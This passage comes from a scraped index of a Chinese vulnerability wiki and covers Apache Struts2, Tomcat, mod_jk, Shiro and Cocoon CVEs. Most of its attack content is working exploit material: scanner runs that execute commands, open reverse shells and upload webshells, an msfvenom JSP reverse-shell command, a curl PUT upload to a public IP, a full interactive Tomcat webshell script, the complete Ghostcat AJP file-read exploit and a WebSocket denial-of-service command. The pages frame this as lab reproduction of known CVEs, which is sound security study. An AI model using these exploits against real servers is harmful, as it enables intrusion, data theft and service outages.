|_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] 正在扫描URL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-046 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-016 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-045 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-015 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-009 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-012 批量漏洞检测: $ python3 Struts2Scan.py -f urls.txt POST数据: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp} 指定漏洞名称利用: # 命令执行 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # 反弹shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] 请在反弹地址处监听端口如: nc -lvvp 8080 # 获取WEB路径 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # 上传shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] 文件上传成功! 关于 因部分原因，原作者关闭漏洞利用，如需利用可删除以下代码使用 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Exphub-Strtus2.html":{"url":"book/Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Exphub-Strtus2.html","title":"扫描工具 Exphub-Strtus2","keywords":"","body":"About Apache Struts2 Python脚本放在当前目录的POC文件夹中 Vulnerability list struts2-032_cmd.py Struts2 method 任意代码执行漏洞GetShell利用脚本(CVE-2016-3081)struts2-032_poc.py Struts2 method 任意代码执行漏洞检测脚本(CVE-2016-3081)struts2-045_cmd.py Struts2 Jakarta Multipart parser 插件远程命令执行漏洞利用脚本1(CVE-2017-5638)[使用]struts2-045-2_cmd.py Struts2 Jakarta Multipart parser 插件远程命令执行漏洞利用脚本2(CVE-2017-5638)[使用]struts2-052_cmd.py Struts2 REST 插件远程代码执行漏洞利用脚本(CVE-2017-9805)struts2-052_webshell.py Struts2 REST 插件远程代码执行漏洞上传Webshell脚本(CVE-2017-9805)struts2-053_cmd.py Struts2 Freemarker 标签远程执行命令漏洞利用脚本(CVE-2017-12611)struts2-057_cmd.py Struts2 Namespace 远程代码执行漏洞利用脚本(CVE-2018-11776) Readme 部分脚本文件使用说明，详细使用分析请参考vulnerability-list中的[使用] VER: 漏洞影响版本，一般情况下不在影响范围的版本没有相关漏洞 USE: 脚本文件使用说明，大部分写在了脚本里，执行即可见 EXP: 脚本利用示例，以及执行效果 DES: 部分特殊脚本文件的特殊描述 参考来源 ExpHub 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Mod_jk/":{"url":"book/Web服务器漏洞/Apache/Apache Mod_jk/","title":"Apache Mod_jk","keywords":"","body":"Apache Mod_jk Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Mod_jk/Apache Mod_jk 访问控制权限绕过 CVE-2018-11759.html":{"url":"book/Web服务器漏洞/Apache/Apache Mod_jk/Apache Mod_jk 访问控制权限绕过 CVE-2018-11759.html","title":"Apache Mod_jk 访问控制权限绕过 CVE-2018-11759","keywords":"","body":"Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 漏洞描述 Apache Tomcat JK（mod_jk）Connector是美国阿帕奇（Apache）软件基金会的一款为Apache或IIS提供连接后台Tomcat的模块，用以为Apache或IIS服务器提供处理JSP/Servlet的能力。 由于httpd和Tomcat在路径处理规范上存在差异，因此可以绕过Apache mod_jk Connector 1.2.0版本到1.2.44版本上由JkMount httpd指令所定义端点的访问控制限制。 如果一个只有只读权限的jkstatus的接口可以访问的话，那么就有可能能够公开由mod_jk模块给AJP提供服务的内部路由。 如果一个具有读写权限的jkstatus接口可供访问，我们就能通过修改AJP的配置文件中相关配置来劫持或者截断所有经过mod_jk的流量，又或者进行内部的端口扫描。 影响版本 [!NOTE] Apache Mod_jk Connector 1.2.0 ~ 1.2.44 环境搭建 git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d 访问 http://xxx.xxx.xxx.xxx:80 成功即可 漏洞复现 访问 http://xxx.xxx.xxx.xxx/jkstatus 显示无权限访问 Forbidden You don't have permission to access /jkstatus on this server. 访问 http://xxx.xxx.xxx.xxx/jkstatus; 即可绕过 [!NOTE] 注意是在url后面加上了一个; 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Tomcat/":{"url":"book/Web服务器漏洞/Apache/Apache Tomcat/","title":"Apache Tomcat","keywords":"","body":"Apache Tomcat Apache Tomcat 信息泄露漏洞 CVE-2021-24122 Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938 Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935 Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat 远程代码执行漏洞 CVE-2017-12615.html":{"url":"book/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat 远程代码执行漏洞 CVE-2017-12615.html","title":"Apache Tomcat 远程代码执行漏洞 CVE-2017-12615","keywords":"","body":"Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 漏洞描述 2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。 影响版本 [!NOTE] Apache Tomcat 7.0.0 - 7.0.81 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080/ 正常即可 漏洞复现 漏洞产生的主要原因来自于conf/web.xml文件配置错误,readonly开启了false,导致可以使用PUT/DELETE请求方法操作文件 msf生成一个jsp木马 msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw > shell.jsp 利用PUT方法上传木马 curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" [!NOTE] 注意 http://xxx.xxx.xxx.xxx:8080/shell.jsp/中的最后一个\"/\"字符很重要 发现成功上传木马文件 访问文件即可反弹一个shell 也可以使用DELETE请求方法删除文件 漏洞利用POC [!NOTE] 代码只用于检测漏洞，反弹shell参照上方 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2017-12615.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8080 \\033[0m') print('+ \\033[36mCmd >>> shell \\033[0m') print('+ \\033[36mCmd >>> exit(退出交互并删除webshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): md5_filename = str(random.randint(1,999)).encode(\"utf-8\") file_name = hashlib.md5(md5_filename).hexdigest() vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" \"\"\" try: response = requests.request(\"PUT\", url=vuln_put_url, data=data, headers=headers, timeout=30) if response.status_code == 201 or response.status_code == 201: print(\"\\033[32m[o] 含有CVE-2017-12615漏洞，成功上传shell，文件名为{}.jsp,响应为{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] 漏洞利用失败,PUT方法关闭 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败,PUT方法关闭 \\033[0m\") sys.exit(0) def POC_2(target_url, file_name, cmd): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi&cmd=\" + cmd headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_cmd_url, headers=headers,timeout=30) if response.status_code == 200: print(\"\\033[32m[o] 成功执行命令,响应为:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败,命令无法执行 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败,命令无法执行 \\033[0m\") sys.exit(0) def POC_3(target_url, file_name): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.request(\"DELETE\", url=vuln_delect_url, headers=headers, timeout=30) if response.status_code == 200 or 201: print(\"\\033[32m[o] 成功删除shell，文件名为{}.jsp,响应为{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] 删除失败 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 删除失败 \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = POC_1(target_url) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": POC_3(target_url, file_name) sys.exit(0) else: POC_2(target_url, file_name, cmd) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html":{"url":"book/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html","title":"Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938","keywords":"","body":"Aapache Tomcat AJP 文件包含漏洞 CVE-2020-1938 漏洞描述 Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 影响版本 [!NOTE] Apache Tomcat 6 Apache Tomcat 7 Apache Tomcat 8 Apache Tomcat 9 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080/ 正常即可 漏洞复现 目前有可靠的利用脚本 Gihub工具下载链接 python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx [!NOTE] 脚本需要使用python2来运行，此漏洞用于上传路径可控，开放8009端口AJP协议情况下通过读取文件执行命令 漏洞利用POC https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\">h\", -1) l = len(s) return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \">h\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\">bbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\">H\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\">h\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_uri) res += pack_string(self.remote_addr) res += pack_string(self.remote_host) res += pack_string(self.server_name) res += struct.pack(\">h\", self.server_port) res += struct.pack(\"?\", self.is_ssl) res += self.pack_headers() res += self.pack_attributes() if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbh\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbh\", 0x41, 0x42, len(res)) return header + res def parse(self, raw_packet): stream = StringIO(raw_packet) self.magic1, self.magic2, data_len = unpack(stream, \"bbH\") self.prefix_code, self.method = unpack(stream, \"bb\") self.protocol = unpack_string(stream) self.req_uri = unpack_string(stream) self.remote_addr = unpack_string(stream) self.remote_host = unpack_string(stream) self.server_name = unpack_string(stream) self.server_port = unpack(stream, \">h\") self.is_ssl = unpack(stream, \"?\") self.num_headers, = unpack(stream, \">H\") self.request_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code > 0xA000: h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001] else: h_name = unpack(stream, \"%ds\" % code) stream.read(1) # \\0 h_value = unpack_string(stream) self.request_headers[h_name] = h_value def send_and_receive(self, socket, stream, save_cookies=False): res = [] i = socket.sendall(self.serialize()) if self.method == AjpForwardRequest.POST: return res r = AjpResponse.receive(stream) assert r.prefix_code == AjpResponse.SEND_HEADERS res.append(r) if save_cookies and 'Set-Cookie' in r.response_headers: self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie'] # read body chunks and end response packets while True: r = AjpResponse.receive(stream) res.append(r) if r.prefix_code == AjpResponse.END_RESPONSE: break elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK: continue else: raise NotImplementedError break return res class AjpResponse(object): _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7) COMMON_SEND_HEADERS = [ \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\", \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\" ] def parse(self, stream): # read headers self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\") if self.prefix_code == AjpResponse.SEND_HEADERS: self.parse_send_headers(stream) elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK: self.parse_send_body_chunk(stream) elif self.prefix_code == AjpResponse.END_RESPONSE: self.parse_end_response(stream) elif self.prefix_code == AjpResponse.GET_BODY_CHUNK: self.parse_get_body_chunk(stream) else: raise NotImplementedError def parse_send_headers(self, stream): self.http_status_code, = unpack(stream, \">H\") self.http_status_msg = unpack_string(stream) self.num_headers, = unpack(stream, \">H\") self.response_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code H\") self.data = stream.read(self.data_length+1) def parse_end_response(self, stream): self.reuse, = unpack(stream, \"b\") def parse_get_body_chunk(self, stream): rlen, = unpack(stream, \">H\") return rlen @staticmethod def receive(stream): r = AjpResponse() r.parse(stream) return r import socket def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]): self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive(self.socket, self.stream) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers) return snd_hdrs_res, data_res ''' javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path ''' import argparse parser = argparse.ArgumentParser() parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") args = parser.parse_args() t = Tomcat(args.target, args.port) _,data = t.perform_request('/asdf',attributes=[ {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']}, {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]}, {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']}, ]) print('----------------------------') print(\"\".join([d.data for d in data])) 参考文章 Github地址 威胁通告 APACHE TOMCAT 文件包含漏洞（CVE-2020-1938） 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935.html":{"url":"book/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935.html","title":"Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935","keywords":"","body":"Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935 漏洞描述 2020年11月06日，360CERT监测发现@RedTeamPentesting发布了Tomcat WebSokcet 拒绝服务漏洞 的分析报告，该漏洞编号为 CVE-2020-13935 ，漏洞等级：高危 ，漏洞评分：7.5 。 未授权的远程攻击者通过发送 大量特制请求包 到Tomcat服务器 ,可造成服务器停止响应并无法提供正常服务 漏洞影响 [!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M6 Apache Tomcat 9.0.0.M1-9.0.36 Apache Tomcat 8.5.0-8.5.56 Apache Tomcat 7.0.27-7.0.104 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d 漏洞复现 访问目标，查看版本是否在漏洞版本范围内 查看攻击前的内存使用情况 CVE-2020-13935 EXP地址 [!NOTE] EXP使用需要GO环境 如果出现 go: github.com/gorilla/websocket@v1.4.2: Get \"https://proxy.golang.org/github.com/gorilla/websocket/@v/v1.4.2.mod\": dial tcp 172.217.160.81:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond. 需要使用命令切换源 go env -w GOPROXY=https://goproxy.cn 使用EXP攻击 tcdos ws://192.168.51.133:8080/examples/websocket/echoStreamAnnotation CPU 负荷超载，成功攻击 漏洞利用POC CVE-2020-13935 EXP地址 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Shiro/":{"url":"book/Web服务器漏洞/Apache/Apache Shiro/","title":"Apache Shio","keywords":"","body":"Apache Shiro Apache Shiro 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Shiro/Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437.html":{"url":"book/Web服务器漏洞/Apache/Apache Shiro/Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437.html","title":"Apache Shiro =1.2.4反序列化漏洞 CVE-2016-4437","keywords":"","body":"Apache Shiro 漏洞描述 Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。 影响版本 [!NOTE] Apache Shiro 漏洞环境 https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d 访问http://xxx.xxx.xxx.xxx:8080/login正常即可 漏洞复现 Shiro已经有比较完善的工具 https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 这里使用的是 ShiroExploit 工具进行复现 打开后输入url即可 成功反弹shell 参考文章 Shiro RememberMe 1.2.4远程代码执行漏洞-详细分析 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Cocoon/":{"url":"book/Web服务器漏洞/Apache/Apache Cocoon/","title":"Apache Coocon","keywords":"","body":"Apache Cocoon Apache Cocoon XML注入 CVE-2020-11991 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Cocoon/Apache Cocoon XML注入 CVE-2020-11991.html":{"url":"book/Web服务器漏洞/Apache/Apache Cocoon/Apache Cocoon XML注入 CVE-2020-11991.html","title":"Apache Cocoon XML注入 CVE-2020-11991","keywords":"","body":"Apache Cocoon XML注入 CVE-2020-11991 漏洞描述 9月11日 Apache 软件基金会发布安全公告，修复了 Apache Cocoon xml外部实体注入漏洞（CVE-2020-11991）。 Apache Cocoon 是一个基于 Spring 框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon 通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。 影响版本 [!NOTE] Apache Cocoon FOFA [!NOTE] app=\"Apache-Cocoon\" 漏洞复现 向/v2/api/product/manger/getInfo POST如下内容 ]> John &ent; 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Cocoon >> http://xxx.xxx.xxx.xxx \\033[0m') 